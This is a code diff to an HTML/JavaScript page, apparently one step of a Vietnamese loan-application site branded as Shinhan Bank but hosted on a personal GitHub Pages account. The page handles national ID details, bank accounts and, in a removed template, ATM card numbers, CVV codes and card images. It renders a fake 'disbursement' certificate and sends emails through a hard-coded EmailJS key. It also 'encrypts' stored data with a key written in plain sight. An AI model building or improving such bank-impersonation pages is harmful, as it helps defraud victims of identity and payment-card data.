@@ -227,6 +227,17 @@
                 box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
             }
         }
+        .error-message {
+            color: #ff4d4f;
+            font-size: 14px;
+            font-weight: 500;
+            text-align: center;
+            margin-top: 5px;
+            padding: 6px;
+            background-color: #ffe6e6;
+            border-radius: 5px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -265,6 +276,7 @@
         </ul>
 
         <div id="step8" class="step-transition">
+            <div class="error-message" id="formError"></div>
             <div class="image-section">
                 <canvas id="disbursementCanvas"></canvas>
             </div>
@@ -300,45 +312,7 @@
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.11.0/dist/email.min.js"></script>
     <script>
         emailjs.init("OrBsI926QI2_xBh1f");
-
-        let userData = {
-            fullName: "",
-            idNumber: "",
-            idIssueDate: "",
-            idIssuePlace: "",
-            address: "",
-            occupation: "",
-            income: "",
-            phoneNumber: "",
-            email: "",
-            loanAmount: "",
-            loanTerm: "",
-            loanPurpose: "",
-            accountNumber: "",
-            bankName: "",
-            termsAgree: false,
-            loanCode: "",
-            registrationDate: "",
-            monthlyPayment: 0,
-            interestRate: 0,
-            sellerCode: "",
-            storeCode: "",
-            staffCode: "",
-            staffName: "",
-            branchName: "",
-            isRegistered: false,
-            qrData: {},
-            atmCard: {
-                cardNumber: "",
-                cardHolderName: "",
-                issueDate: "",
-                expiryDate: "",
-                cvv: "",
-                frontImage: "",
-                backImage: ""
-            },
-            currentStep: 8
-        };
+        let userData = {};
 
         function formatNumber(number) {
             if (!number) return "Không có";
@@ -347,10 +321,12 @@
 
         function saveToLocalStorage() {
             try {
-                localStorage.setItem('userData', JSON.stringify(userData));
+                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
+                localStorage.setItem('userData', encryptedData);
                 console.log('Saved userData to localStorage:', userData);
             } catch (error) {
                 console.error('Error saving userData to localStorage:', error);
+                $('#formError').text('Lỗi lưu dữ liệu. Vui lòng thử lại.').show();
             }
         }
 
@@ -358,20 +334,37 @@
             try {
                 const storedData = localStorage.getItem('userData');
                 if (storedData) {
-                    userData = JSON.parse(storedData);
-                    console.log('Loaded userData from localStorage for Step8:', userData);
+                    userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
+                    console.log('Loaded userData for Step 7:', userData);
+                    if (!userData.isRegistered || !userData.fullName) {
+                        $('#formError').text('Không tìm thấy hồ sơ đã đăng ký. Vui lòng quay lại bước đăng ký.').show();
+                        $('#downloadDisbursementBtn, #proceedToFinalStepBtn, #backToHomeBtn').prop('disabled', true);
+                        setTimeout(() => {
+                            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
+                        }, 3000);
+                    }
                 } else {
-                    console.warn('No userData found in localStorage, using default.');
+                    console.error('No userData found in localStorage');
+                    $('#formError').text('Không tìm thấy dữ liệu hồ sơ. Vui lòng quay lại bước đăng ký.').show();
+                    $('#downloadDisbursementBtn, #proceedToFinalStepBtn, #backToHomeBtn').prop('disabled', true);
+                    setTimeout(() => {
+                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
+                    }, 3000);
                 }
             } catch (error) {
-                console.error('Error parsing userData from localStorage:', error);
+                console.error('Error parsing userData:', error);
+                $('#formError').text('Lỗi tải dữ liệu. Vui lòng quay lại bước đăng ký.').show();
+                $('#downloadDisbursementBtn, #proceedToFinalStepBtn, #backToHomeBtn').prop('disabled', true);
+                setTimeout(() => {
+                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
+                }, 3000);
             }
         }
 
         function sendApprovalEmail() {
             if (!userData.email) {
                 console.error('No email address found in userData.');
-                alert('Không tìm thấy địa chỉ email. Vui lòng kiểm tra thông tin đăng ký.');
+                $('#formError').text('Không tìm thấy địa chỉ email. Vui lòng quay lại bước đăng ký.').show();
                 return;
             }
 
@@ -384,11 +377,11 @@
             emailjs.send("service_60tgxof", "template_e8o1t4w", templateParams)
                 .then(response => {
                     console.log('Email sent successfully:', response.status, response.text);
-                    alert('Email thông báo đã được gửi đến ' + userData.email);
+                    $('#formError').text('Email thông báo đã được gửi đến ' + userData.email).show();
                 })
                 .catch(error => {
                     console.error('Failed to send email:', error);
-                    alert('Lỗi khi gửi email. Vui lòng thử lại sau.');
+                    $('#formError').text('Lỗi khi gửi email. Vui lòng thử lại sau.').show();
                 });
         }
 
@@ -441,15 +434,15 @@
         }
 
         const canvasFields = [
-            { label: "", value: userData.loanCode || "Không có", x: 207, y: 97, font: "27px Arial bold", color: "#000000" },
-            { label: "", value: userData.accountNumber || "Không có", x: 423, y: 322, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: userData.fullName || "Không có", x: 429, y: 354, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: userData.bankName || "Không có", x: 423, y: 390, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: userData.fullName || "Không có", x: 429, y: 444, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: userData.loanAmount || "Không có", x: 209, y: 445, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: userData.idNumber || "Không có", x: 423, y: 487, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: userData.idIssueDate || "Không có", x: 707, y: 487, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: userData.idIssuePlace || "Không có", x: 952, y: 487, font: "23px Arial bold", color: "#000000" }
+            { label: "", value: "", x: 207, y: 97, font: "27px Arial bold", color: "#000000" }, // loanCode
+            { label: "", value: "", x: 423, y: 322, font: "23px Arial bold", color: "#000000" }, // accountNumber
+            { label: "", value: "", x: 429, y: 354, font: "23px Arial bold", color: "#000000" }, // fullName
+            { label: "", value: "", x: 423, y: 390, font: "23px Arial bold", color: "#000000" }, // bankName
+            { label: "", value: "", x: 429, y: 444, font: "23px Arial bold", color: "#000000" }, // fullName
+            { label: "", value: "", x: 209, y: 445, font: "23px Arial bold", color: "#000000" }, // loanAmount
+            { label: "", value: "", x: 423, y: 487, font: "23px Arial bold", color: "#000000" }, // idNumber
+            { label: "", value: "Không có", x: 707, y: 487, font: "23px Arial bold", color: "#000000" }, // idIssueDate
+            { label: "", value: "", x: 952, y: 487, font: "23px Arial bold", color: "#000000" }  // idIssuePlace
         ];
 
         function downloadAsPDF(canvas, filename) {
@@ -465,7 +458,21 @@
 
         window.onload = function() {
             loadUserData();
+
+            // Cập nhật canvasFields với dữ liệu từ userData
+            canvasFields[0].value = userData.loanCode || "Không có";
+            canvasFields[1].value = userData.accountNumber || "Không có";
+            canvasFields[2].value = userData.fullName || "Không có";
+            canvasFields[3].value = userData.bankName || "Không có";
+            canvasFields[4].value = userData.fullName || "Không có";
+            canvasFields[5].value = userData.loanAmount ? `${formatNumber(userData.loanAmount)} VND` : "Không có";
+            canvasFields[6].value = userData.idNumber || "Không có";
+            canvasFields[7].value = userData.idIssueDate || "Không có";
+            canvasFields[8].value = userData.idIssuePlace || "Không có";
+
             renderCanvas('disbursementCanvas', 'https://raw.githubusercontent.com/vaytieudung/shinhanbank/main/assets/img/dieukiengiayngan.png', 'https://via.placeholder.com/1240x1754?text=Hinh+Dieu+Kien+Giai+Ngan');
+            userData.currentStep = 8;
+            saveToLocalStorage();
         };
 
         $('#downloadDisbursementBtn').on('click', function() {
@@ -485,6 +492,8 @@
         $('#backToHomeBtn').on('click', function(e) {
             e.preventDefault();
             sendApprovalEmail();
+            userData.currentStep = 1;
+            saveToLocalStorage();
             window.location.href = 'https://vaytieudung.github.io/shinhanbank/';
         });
     </script>
